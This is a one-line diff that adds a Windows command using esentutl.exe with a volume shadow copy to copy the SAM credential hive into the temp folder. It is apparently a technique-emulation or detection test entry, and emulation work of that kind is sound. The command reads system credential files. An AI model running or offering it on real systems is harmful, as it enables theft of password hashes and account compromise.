@@ -1,0 +1,1 @@
+esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
